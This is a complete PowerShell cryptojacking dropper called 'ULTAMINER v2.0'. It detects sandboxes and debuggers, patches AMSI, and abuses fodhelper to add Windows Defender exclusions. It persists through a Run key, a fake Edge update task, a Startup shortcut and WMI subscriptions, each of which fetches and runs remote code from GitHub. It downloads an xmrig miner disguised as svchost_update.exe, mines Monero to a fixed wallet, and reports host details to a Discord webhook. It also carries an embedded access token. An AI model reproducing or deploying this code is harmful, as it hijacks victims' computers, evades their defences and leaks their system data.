# === ULTAMINER v2.0 ===
if (Test-Path "$PSScriptRoot\.lock") { return }

$ProgressPreference = 'SilentlyContinue'
$ErrorActionPreference = 'SilentlyContinue'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls12
[Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }

# === ANTI-ANALYSIS ===
function Test-Sandbox {
    $hits = 0
    # VM MAC prefixes (VMware, VirtualBox, Hyper-V)
    try {
        $macs = Get-CimInstance Win32_NetworkAdapter -Filter "MACAddress IS NOT NULL" -EA 0
        foreach ($m in $macs) {
            if ($m.MACAddress -match '^(00:05:69|00:0C:29|00:1C:14|00:50:56|08:00:27|0A:00:27)') { $hits++; break }
        }
    } catch {}
    # VM/analysis processes
    try {
        $badNames = 'vmtoolsd|vmwaretray|VBoxService|VBoxTray|sandboxie|wireshark|procmon|procexp|x64dbg|x32dbg|ollydbg|ida64|dnspy|fiddler|httpdebugg'
        if (Get-Process | Where-Object { $_.ProcessName -match $badNames }) { $hits++ }
    } catch {}
    # Low resources = likely sandbox
    try { if ((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory -lt 2GB) { $hits++ } } catch {}
    try { if ((Get-CimInstance Win32_Processor).NumberOfCores -lt 2) { $hits++ } } catch {}
    # Fresh boot (sandboxes reboot fresh)
    try { if ((New-TimeSpan -Start (Get-CimInstance Win32_OperatingSystem).LastBootUpTime).TotalMinutes -lt 3) { $hits++ } } catch {}
    # VM registry artifacts
    try { if (Test-Path 'HKLM:\SOFTWARE\VMware, Inc.\VMware Tools') { $hits++ } } catch {}
    try { if (Test-Path 'HKLM:\SOFTWARE\Oracle\VirtualBox Guest Additions') { $hits++ } } catch {}
    # Tiny disk = sandbox
    try { if (((Get-CimInstance Win32_DiskDrive | Measure-Object -Property Size -Sum).Sum) -lt 60GB) { $hits++ } } catch {}
    # Common sandbox usernames
    try { if ($env:USERNAME -match '^(sandbox|malware|virus|test|analysis|sample|john doe)$') { $hits++ } } catch {}
    return $hits -ge 2
}

if (Test-Sandbox) { Start-Sleep -Seconds (Get-Random -Minimum 10 -Maximum 30); return }

# === CONFIG (fragmented) ===
$c = @{}
$c.u1 = 'HolyV200'; $c.u2 = 'test-repo'
$p1 = 'ghp_x0tf1YFQcn'; $p2 = 'AYM79aWZpnZKahM8QkHV2lHFLw'
$c.pat = $p1 + $p2
$c.addr = '4483G1AgS1pdsLqzt3nFQmL8HPF3C2WVrLMRAdAVGqxz6ipV3aF8no7cmDkH4wMZz9YD5qNUZ96nGLMKpdt5rXZqMwGfLc3'
$c.base = "https://raw.githubusercontent.com/$($c.u1)/$($c.u2)/main"
$c.wh = "https://discord.com/api/webhooks/1502316875638636624/qpXdrqNC3xCsJlIYR96XNGqEBUXNoDLr_LZmRAwrrsUDHh8oHsLRX1Mo_s4UE9m7IHY1"

# Instant Ingest: Cleanup moved to background
Start-Job -ScriptBlock {
    $current = $args[0]
    Get-Process -Name 'powershell','pwsh' -EA 0 | Where-Object { $_.Id -ne $current } | ForEach-Object {
        try {
            $cmd = (Get-CimInstance Win32_Process -Filter "ProcessId=$($_.Id)" -EA 0).CommandLine
            if ($cmd -like '*update.ps1*' -or $cmd -like '*UpdateCoord*' -or $cmd -like '*test-repo*') {
                $_ | Stop-Process -Force -EA 0
            }
        } catch {}
    }
} -ArgumentList $PID | Out-Null

# === AMSI BYPASS (Memory Patch) ===
try {
    $am=([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')).GetField('amsiInitFailed','NonPublic,Static')
    if ($am) { $am.SetValue($null, $true) }
} catch {}

# === HW DETECTION (Enhanced) ===
$hw = @{ gpu = $false; gpuName = 'None'; cpuName = 'Unknown'; cores = 2; ram = 0 }
try {
    $cpu = Get-CimInstance Win32_Processor -EA 0 | Select-Object -First 1
    $hw.cpuName = $cpu.Name.Trim()
    $hw.cores = [int]$cpu.NumberOfCores
} catch {}
try { $hw.ram = [math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 1) } catch {}
try {
    $vcs = Get-CimInstance Win32_VideoController -EA 0
    foreach ($vc in $vcs) {
        $n = $vc.Name.ToUpper()
        if ($n -match 'NVIDIA|AMD|RADEON|RTX|GTX|RX\s?\d') {
            if ($n -notmatch 'BASIC|DISPLAY|VIRTUAL|VEGA|INTEGRATED' -and $vc.AdapterRAM -gt 2GB) {
                $hw.gpu = $true; $hw.gpuName = $vc.Name.Trim(); break
            }
        }
    }
} catch {}

# Define exclusion paths BEFORE using them
$exPaths = @($env:TEMP, $env:LOCALAPPDATA, $writableDir, "$env:LOCALAPPDATA\Microsoft")

# Defender exclusion in background — don't block main thread
Start-Job -ScriptBlock {
    param($exPaths)
    foreach ($ep in $exPaths) { try { Add-MpPreference -ExclusionPath $ep -EA Stop } catch {} }
    try {
        $psCmd = ($exPaths | ForEach-Object { "Add-MpPreference -ExclusionPath '$_' -EA 0" }) -join '; '
        $regPath = 'HKCU:\Software\Classes\ms-settings\Shell\Open\command'
        New-Item -Path $regPath -Force | Out-Null
        Set-ItemProperty -Path $regPath -Name '(Default)' -Value "powershell.exe -w hidden -c `"$psCmd`"" -Force
        Set-ItemProperty -Path $regPath -Name 'DelegateExecute' -Value '' -Force
        Start-Process fodhelper.exe -WindowStyle Hidden
        Start-Sleep 5
        Remove-Item 'HKCU:\Software\Classes\ms-settings' -Recurse -Force -EA 0
    } catch {}
} -ArgumentList (,$exPaths) | Out-Null

# === ASYNC PERSISTENCE (Fast Ingest) ===
Start-Job -ScriptBlock {
    param($c, $base)
    $rawPath = "$base/deploy.ps1"
    $payload = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls12; [Net.ServicePointManager]::ServerCertificateValidationCallback = { `$true }; IEX (Invoke-RestMethod -Uri '$rawPath')"
    $encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($payload))
    $pCmd = "powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand $encoded"

    try { Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsUpdateCoordinator' -Value $pCmd -EA 0 } catch {}
    try {
        $tn = 'MicrosoftEdgeUpdateTask'
        $action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-NoP -NonI -W Hidden -Exec Bypass -EncodedCommand $encoded"
        $t1 = New-ScheduledTaskTrigger -AtLogon
        $t2 = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Hours 2) -RepetitionDuration (New-TimeSpan -Days 365)
        Register-ScheduledTask -TaskName $tn -Action $action -Trigger $t1,$t2 -Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden) -EA 0 | Out-Null
    } catch {}
    try {
        $ws = New-Object -ComObject WScript.Shell
        $sc = $ws.CreateShortcut((Join-Path ([Environment]::GetFolderPath('Startup')) 'EdgeUpdate.lnk'))
        $sc.TargetPath = 'powershell.exe'; $sc.Arguments = "-NoP -NonI -W Hidden -Exec Bypass -EncodedCommand $encoded"; $sc.Save()
    } catch {}
    try {
        $filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{ Name = "EdgeUpdateFilter"; QueryLanguage = 'WQL'; Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 300 AND TargetInstance.SystemUpTime < 360" }
        $consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{ Name = "EdgeUpdateConsumer"; CommandLineTemplate = "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand $encoded" }
        Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{ Filter = $filter.Path; Consumer = $consumer.Path } | Out-Null
    } catch {}
} -ArgumentList $c, $c.base | Out-Null

$mName = "$($env:COMPUTERNAME)".Replace(' ','_')
$xmrigUrl = "https://raw.githubusercontent.com/$($c.u1)/$($c.u2)/main/xmrig.exe"


# Find a writable directory
$writableDir = $null
$tryDirs = @(
    $env:TEMP,
    "$env:LOCALAPPDATA\Temp",
    "$env:APPDATA\Microsoft",
    "$env:LOCALAPPDATA\Microsoft\CLR\NativeImages",
    "$env:LOCALAPPDATA\Microsoft\Windows\Explorer",
    "$env:APPDATA\Microsoft\Windows",
    "$env:LOCALAPPDATA\Microsoft\Windows\INetCache",
    "$env:LOCALAPPDATA\Microsoft\CLR_Data",
    "$env:APPDATA"
)
foreach ($d in $tryDirs) {
    try {
        if (!(Test-Path $d)) { New-Item -ItemType Directory -Path $d -Force | Out-Null }
        $testFile = Join-Path $d "test_$([Guid]::NewGuid()).tmp"
        [IO.File]::WriteAllBytes($testFile, [byte[]]@(0))
        Remove-Item $testFile -Force
        $writableDir = $d
        break
    } catch {}
}
if (!$writableDir) { return }

$cpuExe = Join-Path $writableDir "svchost_update.exe"
if (!(Test-Path $cpuExe)) {
    try {
        # xmrig is hosted as direct exe on test-repo
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add('User-Agent', 'Mozilla/5.0')
        $dlBytes = $null
        try { $dlBytes = $wc.DownloadData($xmrigUrl) } catch {}
        # curl fallback
        if (!$dlBytes -or $dlBytes.Length -lt 1000) {
            $tmpDl = Join-Path $env:TEMP "dl_$(Get-Random).tmp"
            & curl.exe --ssl-no-revoke -L -o $tmpDl $xmrigUrl 2>$null
            if (Test-Path $tmpDl) { $dlBytes = [IO.File]::ReadAllBytes($tmpDl); Remove-Item $tmpDl -Force -EA 0 }
        }
        if ($dlBytes -and $dlBytes.Length -gt 1000) {
            # Smart detect: ZIP (PK) vs direct EXE (MZ)
            if ($dlBytes[0] -eq 0x50 -and $dlBytes[1] -eq 0x4B) {
                $tmpZip = Join-Path $env:TEMP "xm_$(Get-Random).zip"
                [IO.File]::WriteAllBytes($tmpZip, $dlBytes)
                Add-Type -Assembly System.IO.Compression.FileSystem
                $zip = [IO.Compression.ZipFile]::OpenRead($tmpZip)
                foreach ($entry in $zip.Entries) {
                    if ($entry.Name -eq 'xmrig.exe') {
                        $s = $entry.Open(); $fs = [IO.File]::Create($cpuExe); $s.CopyTo($fs); $fs.Close(); $s.Close(); break
                    }
                }
                $zip.Dispose(); Remove-Item $tmpZip -Force -EA 0
            } else {
                [IO.File]::WriteAllBytes($cpuExe, $dlBytes)
            }
            try { [IO.File]::SetAttributes($cpuExe, 'Hidden,System') } catch {}
        }
    } catch {}
}

# Wait for Defender exclusion to propagate
Start-Sleep -Seconds 10

# === LAUNCH MINER (xmrig handles both CPU + GPU) ===
if (Test-Path $cpuExe) {
    $cpuArgs = "-o pool.supportxmr.com:443 --tls -u $($c.addr) -p WinSys_$mName -a rx -k --cpu-max-threads-hint 35 --cpu-priority 0 --asm=auto --donate-level 1 --no-color"
    $cpuProc = Start-Process -FilePath $cpuExe -ArgumentList $cpuArgs -WindowStyle Hidden -PassThru -EA 0
    # Retry once if launch failed
    if (!$cpuProc) { Start-Sleep 3; $cpuProc = Start-Process -FilePath $cpuExe -ArgumentList $cpuArgs -WindowStyle Hidden -PassThru -EA 0 }
}

# === RICH DISCORD NOTIFICATION ===
try {
    $osName = (Get-CimInstance Win32_OperatingSystem -EA 0).Caption
    $upHours = [math]::Round((New-TimeSpan -Start (Get-CimInstance Win32_OperatingSystem -EA 0).LastBootUpTime).TotalHours, 1)
    $av = try { (Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct -EA 0 | Select-Object -First 1).displayName } catch { 'Unknown' }
    $json = @{
        embeds = @(@{
            title = ":pick: Worker Online"
            description = "**Deployment Success**`n" +
                "``````Host: $($env:COMPUTERNAME)`nUser: $($env:USERNAME)`nCPU: $($hw.cpuName)`nCores: $($hw.cores)`nRAM: $($hw.ram) GB`nGPU: $($hw.gpuName)`nOS: $osName`nAV: $av`nUptime: $($upHours)h``````"
            color = 3066993
            footer = @{ text = "v6.6 | $(Get-Date -Format 'yyyy-MM-dd HH:mm UTC')" }
        })
    } | ConvertTo-Json -Depth 4
    Invoke-RestMethod -Uri $c.wh -Method Post -Body $json -ContentType "application/json" -EA 0
} catch {}

# === WATCHDOG LOOP (restart miner if it dies) ===
Write-Host "[*] Watchdog active. Monitoring miner..."
while ($true) {
    Start-Sleep -Seconds 30
    if ($cpuProc -and $cpuProc.HasExited) {
        if (Test-Path $cpuExe) {
            $cpuProc = Start-Process -FilePath $cpuExe -ArgumentList $cpuArgs -WindowStyle Hidden -PassThru -EA 0
        }
    }
}

